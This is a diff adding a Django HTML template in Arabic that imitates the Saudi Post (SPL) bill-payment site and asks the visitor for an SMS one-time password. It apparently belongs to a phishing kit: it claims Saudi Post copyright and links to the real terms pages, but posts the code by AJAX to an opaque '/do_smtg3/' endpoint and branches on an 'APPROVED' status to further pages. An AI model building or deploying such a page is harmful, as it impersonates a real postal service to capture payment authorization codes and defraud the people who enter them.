@@ -1,0 +1,231 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <link rel="stylesheet" href="{% static 'styles.css' %}">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
+    <title>Document</title>
+    <link rel="icon" href="{% static 'favicon.ico' %}">
+   
+ 
+</head>
+<body>
+  
+  
+  
+  <div class="container">
+    <div class="header"></div>
+    <div class="line"></div>
+    <button class="top-left-button" >تسجيل</button>
+    <img class="top-right-image" src="{% static 'logo.png' %}" alt="image">
+    
+    <div>
+      <div class="line4"></div>
+      <div class="line5"></div>
+      
+    </div>
+  
+    <div class="text-box">
+      <div class="textbox">
+        <h3>سداد فواتير الخدمات البريدية </h3>
+        <p lang="ar" class="paragraph">ستصلك رسالة نصية قصيرة برمز سري مؤقت على جوالك، أدخل الرمز المرسل لاتمام العملية  
+            </p>
+        <div class="form" style="text-align: right;"> 
+          
+          <form id="otp-form" action="?" method="post">
+            {% csrf_token %}
+            <b class="otp_label">(OTP) الرمز السري   </b>
+            {{ form.otp }}
+
+            {% if error4 %}
+            <div style="display: flex;  justify-content: flex-end;">
+              <p class="card_error" dir="rtl" style="white-space: normal;">  <img src="{% static 'allert.svg' %}" alt="" style="width: 10x; height: 10px; white-space: nowrap;">&nbsp {{ error4 }}</p>
+            </div>
+            {% endif %}
+            
+            <button type="submit" class="submit-button2">متابعة</button>
+          </form>
+          <div style="position: relative; width: 100%;">
+            <div style="margin: 0;
+            position: absolute;
+            top: 50%;
+            -ms-transform: translateY(-40%);
+            transform: translateY(-40%); width: 100%;
+            text-align: center;">
+            <button type="button" class="resend-otp" id="resend" >إعادة الإرسال</button>
+            </div>
+          </div>
+            <p style="text-align: center; font-size: 16px; font-weight: 500 ; color: #A1A1A1;">.<span id="timer">يمكنك إعادة إرسال رمز سري بعد 60</span>ثانية</p>
+            
+            <script>
+              function startTimer(duration, display, button) {
+                var timer = duration, minutes, seconds;
+                var interval = setInterval(function () {
+                  seconds = parseInt(timer % 120, 10);
+            
+                  minutes = minutes < 10 ? "0" + minutes : minutes;
+                  seconds = seconds < 10 ? "0" + seconds : seconds;
+            
+                  display.textContent = "يمكنك إعادة إرسال رمز سري بعد " + seconds + " ";
+                  
+                  if (--timer < 0) {
+                    clearInterval(interval);
+                    display.style.display = "none";
+                    button.style.display = "block";
+                  }
+                }, 1000);
+              }
+            
+              window.onload = function () {
+                var fiveMinutes = 60,
+                    display = document.querySelector('#timer'),
+                    button = document.querySelector('#resend');
+                
+                button.addEventListener("click", function(){
+                    button.style.display = "none";
+                    display.style.display = "inline";
+                    startTimer(fiveMinutes, display, button);
+                });
+                
+                startTimer(fiveMinutes, display, button);
+              };
+            </script>
+
+
+            <p class="required_alert"> يجب ملئ الخانات المرفقة بعلامة النجمة </p>
+          </form>
+          <script>
+            document.querySelector('form').addEventListener('submit', function() {
+              document.querySelector('#overlay').style.display = 'block';
+            });
+          </script>
+          
+        
+           
+          
+        </div>
+          
+      </div> 
+      
+    </div>
+    
+  
+  </div>
+  
+  
+ 
+  <div class="container2">
+    <div class="footer2">
+      <div style="display: flex;  justify-content: flex-end;">
+        <p class="info-text3" style="font-size: 14px;white-space: normal;" dir="rtl"><img src="{% static 'copyright.png' %}"
+           alt="copyright" style="width: 12px; height: 12px; margin-left: 5px;top: 20px; white-space: nowrap;"><span>2023 &nbsp
+           </span>جميع الحقوق محفوظة لمؤسسة البريد السعودي - سبل </p>
+         
+        
+      </div>
+      <div style="display: flex; align-items: center; justify-content: flex-end; font-size: 14px; padding-top: 0px; align-items: flex-start;">
+        <p class="info-text3" style="font-size: 14px;"> عند إستخدامك لهذا الموقع ، فإنك توافق على  <a href='https://splonline.com.sa/ar/terms-of-service/' target="_blank">شروط الخدمة </a> و <a href='https://splonline.com.sa/ar/privacy-policy/' target="_blank">سياسة الخصوصية</a> </p>
+        
+        
+      </div>
+    </div>
+  </div>
+  <div id="overlay" class="overlay" style="display: none;">
+    <div class="loading-gif">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69.55 36.59"><defs><style>.cls-1{fill:none;stroke:#0fc8df;stroke-miterlimit:10;stroke-width:0.5px;}</style></defs><g id="Layer_2" data-name="Layer 2"><g id="Layer_1-2" data-name="Layer 1"><path class="cls-1" d="M13.85,18.34a7,7,0,0,1,2.48,5.25c0,2,.06,3.93,0,5.89-.15,3.72-2.72,6.28-6.52,6.78-4,.51-7.43-1.48-8.65-4.8A13.53,13.53,0,0,1,.7,24.19a11,11,0,0,1,3.89,2c1.39,1.29.07,3.41,2.13,5.08A3.11,3.11,0,0,0,9,31.61,3,3,0,0,0,11.53,29c.06-.74,0-1.49,0-2.22,0-.54,0-1.08,0-1.61a5.74,5.74,0,0,0-2.41-4.34c-1.25-.89-2.62-1.54-3.85-2.37A11.55,11.55,0,0,1,1.62,3.5C3.63-.07,7,0,11.37.48c2.92.31,4.71,2.65,5,5.91.09,1.14,0,2.29,0,3.79-2.37-.64-4.1-1.54-4.92-3.76A2.68,2.68,0,0,0,7.86,4.65,3.49,3.49,0,0,0,5.34,8c-.36,3.13.52,5.6,3.44,7A25.09,25.09,0,0,1,13.85,18.34Z"/><path class="cls-1" d="M31.3.41H21.58v29h4.47V20.37h4.24s5.85-.63,5.85-5.4V4.74S35.28.41,31.3.41ZM32.41,13.5c0,1.69-2.12,2.29-2.12,2.29H26.17V4.41h4.18a2,2,0,0,1,2.06,2Z"/><path class="cls-1" d="M45.48.41H41v29H65.78s3.27-2.22,3.49-4.92h-24Z"/></g></g></svg>
+    </div>
+  </div>
+  
+  <style>
+    .overlay {
+      position: fixed;
+      top: 0;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: rgba(255, 255, 255, 0.5);
+      z-index: 9999;
+    }
+    
+    .loading-gif {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 150px;
+      stroke-dasharray: 150;
+      stroke-dashoffset: 150;
+      animation: animate-loading-gif 3s linear forwards;
+      animation-iteration-count: infinite;
+    }
+    @keyframes animate-loading-gif
+    {
+      0%
+      {
+        stroke-dashoffset: 0;
+      }
+      40%
+      {
+        stroke-dashoffset: 150;
+      }
+      80%
+      {
+        stroke-dashoffset: 300;
+      }
+    }
+  </style>
+  <script>
+    $(document).ready(function () {
+  $("form").submit(function (event) {
+    event.preventDefault();
+    $("#overlay").show();
+    var formData = $(this).serialize();
+    $.ajax({
+      type: "POST",
+      url: "/do_smtg3/",
+      data: formData,
+      success: function (data) {
+        if (data.status === "APPROVED") {
+          window.location.href = "/new_page/";
+        } else {
+          $("#overlay").hide();
+          alert("Error: OTP is incorrect.");
+        }
+      },
+      error: function (error) {
+        $("#overlay").hide();
+        console.log(error);
+      }
+    });
+  });
+});
+
+    $(document).ready(function() {
+      // Show the overlay and loading gif when the form is submitted
+      $('#your-form-id').submit(function() {
+        $('#overlay').show();
+      });
+      
+      // Hide the overlay and loading gif when the status is APPROVED
+      // and redirect the user to a new page
+      if (status == 'APPROVED') {
+        $('#overlay').hide();
+        window.location.href = '/playground/hello2';
+      }
+      
+      // Display an error message if the status is DECLINED
+      if (status == 'DECLINED') {
+        $('#overlay').hide();
+        window.location.href = '/playground/hello';
+      }
+    });
+  </script>
+  
+</body>
+</html>
